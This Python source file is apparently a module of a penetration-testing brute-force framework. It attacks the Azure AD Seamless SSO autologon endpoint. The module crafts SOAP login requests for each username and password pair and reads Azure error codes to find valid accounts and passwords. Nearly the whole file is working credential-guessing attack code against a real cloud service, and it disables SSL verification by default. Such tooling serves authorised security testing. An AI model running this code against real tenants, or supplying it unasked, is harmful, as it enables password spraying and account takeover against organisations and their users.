import re
import inspect
from bfg.data import loadAzureSSOSoap
from datetime import datetime, timedelta
from xmltodict import parse as xmltodict
from xml.sax.saxutils import escape as xEscape
from requests import Session
from dict_tools.data import subdict_match, traverse_dict
from uuid import uuid4 as uuid
from bfg.args import http as http_args, argument
from bfg.shortcuts.http import HTTPModule, handleUA
from bfg.shortcuts.azure import *
from requests.exceptions import ConnectionError

AZURE_SSO_URL   = 'https://autologon.microsoftazuread-sso.com'
AZURE_SSO_PATH  = '/{domain}/winauth/trust/2005/usernamemixed?' \
    'client-request-id={request_id}'
SOAP_DICT_PATH = 'S:Envelope-S:Body-S:Fault-S:Detail-psf:' \
    'error-psf:internalerror-psf:text'
SSO_TIME_FMT = '%Y-%m-%dT%H:%M:%S.%fZ'
SOAP_DOC = loadAzureSSOSoap()

def strip_slash(s):

    if s and s[-1] == '/':
        s=s[:len(s)-1]

    return s

class Session(Session):

    def __init__(self, url=None, headers=None, allow_redirects=None,
            verify_ssl=False, *args, **kwargs):

        super().__init__(*args, **kwargs)

        # Configure redirects
        self.allow_redirects=allow_redirects

        # using the setattr builtin here because requests.Session
        # doesn't care for new instance variables being assigned
        setattr(self, 'verify_ssl', verify_ssl)

        self.url = url

        # Update headers
        headers = headers if headers else {}
        self.headers.update(headers)

    def authenticate(self, username, password):

        if not '@' in username:
            message = (
                f'Username not supplied in email format: {username} .'
                'Disabling user from further guesses.')
            return -1, False, [message]

        credential = f'{username}:{password}'

        # ==================
        # PREPARE COMPONENTS
        # ==================

        # URL to target
        url = self.url + AZURE_SSO_PATH.format(
            domain=username.split('@')[1],
            request_id=str(uuid()))

        # Damned timestampes....friggen SOAP
        now = datetime.utcnow()
        created = now.strftime(SSO_TIME_FMT)
        expires = (now + timedelta(minutes=10)).strftime(SSO_TIME_FMT)

        # Craft the SOAP document
        payload = SOAP_DOC.format(
            url = url,
            message_id = str(uuid()),
            created = created,
            expires = expires,
            token_id = str(uuid()),
            username = xEscape(username),
            password = xEscape(password))

        # ======================================
        # MAKE THE REQUEST AND HANDLE THE OUTPUT
        # ======================================

        resp  =  self.post(url, data=payload,
            allow_redirects = self.allow_redirects,
            verify = self.verify_ssl)

        error_code = None

        try:

            sdict = xmltodict(resp.content)
            error_code = traverse_dict(sdict,
                key = SOAP_DICT_PATH,
                delimiter = '-')

        except Exception as e:

            # ==============================
            # REQUEST APPEARS TO HAVE FAILED
            # ==============================

            message = \
                f'Failed to parse XML response for {credential}. Reason: {e}'

            return -1, True, [message]

        if not error_code and resp.status_code == 200:

            # ======================
            # BASIC SUCCESS RESPONSE
            # ======================

            return 1, True, ['200 OK response']

        elif error_code:

            # ===================
            # ALL OTHER RESPONSES
            # ===================

            try:
                error_code = error_code.split(':')[0]
            except:
                pass

            outcome, username_valid, events = \
                lookupCode(resp.status_code, error_code)

            if events:
                events[0] += f' - {credential}'

            return outcome, username_valid, events

        else:

            return -1, True, ['Unhandled response event occurred'] 

def url():

    return http_args.url(
        name_or_flags=('--url',),
        required=False,
        default=AZURE_SSO_URL,
        help='Azure SSO URL to target. Default: %(default)s')

class Module(HTTPModule):

    brief_description = 'Azure Active Directory AD Seamless SSO'
    description = 'Brute force the Azure AD SSO endpoint.'
    args = [url()]+http_args.getDefaults('url',invert=True)
    contributors = [
            dict(
                name='Justin Angel [Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu'))
        ]
    references = [
        'SecureWorks - Vuln Disclosure - https://www.secureworks.com' \
                '/research/undetected-azure-active-directory-brute-f' \
                'orce-attacks'
        ]

    @handleUA 
    def __call__(self, username, password, *args, **kwargs):
        '''Proxy the call request up to the Session object to perform
        authentication.
        '''

        session = Session(url=self.url,
                headers=self.headers,
                verify_ssl=self.verify_ssl,
                allow_redirects=self.allow_redirects)

        if self.proxies:
            session.proxies.update(self.proxies)

        try:

            outcome, valid_account, events = \
                session.authenticate(username, password)

        except ConnectionError:

            return dict(
                outcome=-1,
                username=username,
                password=password,
                events=['Connection timed out'])

        events = events if events else []

        return dict(outcome=outcome,
                username=username,
                password=password,
                actionable=valid_account,
                events=events)


